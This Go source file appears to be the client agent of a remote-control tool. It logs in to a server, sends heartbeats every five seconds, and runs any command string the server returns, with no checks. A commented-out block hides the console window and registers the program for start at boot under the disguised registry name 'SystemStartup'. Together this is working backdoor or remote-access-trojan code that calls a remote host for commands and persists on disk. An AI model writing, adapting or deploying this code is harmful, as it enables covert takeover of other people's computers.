package main

import (
	"bytes"
	"dominant/api/http_api"
	"dominant/api/server"
	"dominant/infrastructure/messaging/mq"

	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"time"
)

var ExecutorId string

const BaseUrl = server.BaseUrl

var client *http.Client

var token string

var exitChan chan bool

func init() {
	client = &http.Client{}
	exitChan = make(chan bool)
	ExecutorId = "u89u89"
	token = ""
	login()
	////隐藏终端窗口，修改windows注册表实现开机自动启动
	//keyName := `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` //自启动注册表路径
	//valueName := `SystemStartup`                                                  //伪装注册表名
	//regType := `REG_SZ`
	//regData, _ := os.Executable()
	//cmdLine:=	fmt.Sprintf(`reg add %s /v %s /t %s /d "%s"`, keyName, valueName, regType, regData)
	//cmd:=NewCommand(cmdLine)
	//go cmd.Exec()
}

func main() {
	log.Println("登录id：", ExecutorId)
	log.Println("登录token：", token)
	if token == "" {
		log.Println("登录失败！")
		return
	}
	go func() {
		for {
			alive()
			time.Sleep(5 * time.Second)
		}
	}()
	go func() {
		for {
			time.Sleep(5 * time.Second)
			msg := getMessage()
			if msg != nil {
				cmdLine := msg.Content
				if cmdLine != nil {
					cmd := NewCommand(cmdLine.(string))
					cmd.Exec()
				}
			} else {
				continue
			}
		}
	}()
	select {
	case <-exitChan:
		return
	}
}

func getMessage() *mq.Message {
	url := fmt.Sprintf("%s/getMessage", BaseUrl)
	req, _ := http.NewRequest("GET", url, nil)
	query := req.URL.Query()
	query.Add("id", ExecutorId)
	req.URL.RawQuery = query.Encode()
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, err := io.ReadAll(resp.Body)
	msg := &mq.Message{}
	err = json.Unmarshal(body, msg)
	if err != nil {
		return nil
	}
	return msg
}

func postFeedback(m *mq.Message) {

}

func login() {
	url := fmt.Sprintf("%s/login", BaseUrl)
	data := make(map[string]string)
	data["id"] = ExecutorId
	bytesData, err := json.Marshal(data)
	req, _ := http.NewRequest("POST", url, bytes.NewReader(bytesData))
	req.Header.Set("Content-Type", "application/json;charset=UTF-8")
	resp, err := client.Do(req)
	body, err := io.ReadAll(resp.Body)
	msg := &mq.Message{}
	err = json.Unmarshal(body, msg)
	if err != nil {
		return
	}
	content, _ := msg.Content.(string)
	token = content
	fmt.Println(msg.Content)
}

func alive() {
	url := fmt.Sprintf("%s/verify", BaseUrl)
	cmd := http_api.ConnectCommand{
		ID:    ExecutorId,
		Token: token,
	}
	bytesData, err := json.Marshal(cmd)
	req, _ := http.NewRequest("POST", url, bytes.NewReader(bytesData))
	req.Header.Set("Content-Type", "application/json;charset=UTF-8")
	resp, err := client.Do(req)
	body, err := io.ReadAll(resp.Body)
	msg := &mq.Message{}
	err = json.Unmarshal(body, msg)
	success, _ := msg.Content.(bool)
	if !success {
		log.Println("验证失败！")
		exitChan <- true
	}
	if err != nil {
		return
	}
	fmt.Println(msg.Content)
}
